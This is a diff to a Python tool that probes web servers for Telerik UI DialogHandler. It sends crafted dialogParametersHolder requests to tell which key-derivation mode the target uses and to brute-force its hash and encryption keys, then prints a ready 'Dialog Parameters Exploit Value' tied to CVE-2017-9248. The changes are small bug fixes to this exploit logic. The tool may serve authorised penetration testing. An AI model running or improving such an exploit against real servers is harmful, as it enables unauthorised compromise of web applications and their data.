@@ -102,6 +102,9 @@ def main():
 
     args = parser.parse_args()
 
+    if not args.url:
+        return
+
     proxies = None
     if args.proxy:
         proxies = {"http": args.proxy, "https": args.proxy}
@@ -117,18 +120,20 @@ def main():
         return
     resp_body = urllib.parse.unquote(res.text)
     if "Loading the dialog..." not in resp_body:
-        print(f"Url does not appear to be a Telerik UI DialogHandler")
+        print(f"URL does not appear to be a Telerik UI DialogHandler")
         return
 
+    key_derive_mode = "PBKDF1_MS"
     KDF_probe_data = {"dialogParametersHolder": "AAAA"}
     res = requests.post(args.url, data=KDF_probe_data, proxies=proxies, headers=headers, verify=False)
     resp_body = res.text
+
     if "Exception of type 'System.Exception' was thrown" in resp_body:
         key_derive_mode = "PBKDF2"
         print(
             "Target is a newer version of Telerik UI without verbose error messages. Hash key and Encryption key will have to BOTH match. PBKDF2 key derivation is used."
         )
-    elif "The hash it not valid!" in resp_body:
+    elif "Length cannot be less than zero" in resp_body:
         key_derive_mode = "PBKDF1_MS"
         print(
             "Target is post-CVE-2017-9248 patched but old enough to use older PBKDF1_MS key dervivation. Hash key can be solved independently."
@@ -158,10 +163,6 @@ def main():
             elif "The hash is not valid!" in resp_body:
                 continue
 
-            elif "Exception of type 'System.Exception' was thrown" in resp_body:
-
-                continue
-
             elif "The input is not a valid Base-64 string" in resp_body:
                 print("The target appears to be a pre-2017 version, and does not have a hash key.")
                 print("This means it should be vulnerable to CVE-2017-9248!!!")
@@ -169,10 +170,8 @@ def main():
 
         if found_hash_key:
             print("Since we found a valid hash key, we can check for known Telerik Encryption Keys")
-
-            #  derivedKey, derivedIV = y.telerik_derivekeys("6YXEG7IH4XYNKdt772p2ni6nbeDT772P2NI6NBE4@")
             for encryption_key_probe, encryption_key in y.encryptionkey_probe_generator(
-                hash_key, include_machinekeys=False
+                hash_key, key_derive_mode, include_machinekeys=False
             ):
                 data = {"dialogParametersHolder": encryption_key_probe}
                 res = requests.post(args.url, data=data, proxies=proxies, headers=headers, verify=False)
@@ -230,6 +229,9 @@ def main():
                 print("Dialog Parameters Exploit Value:")
                 print(urllib.parse.quote_plus(dialog_parameters))
                 return
+
+    else:
+        print("Did not find hashkey / encryption key. Exiting.")
 
 
 if __name__ == "__main__":
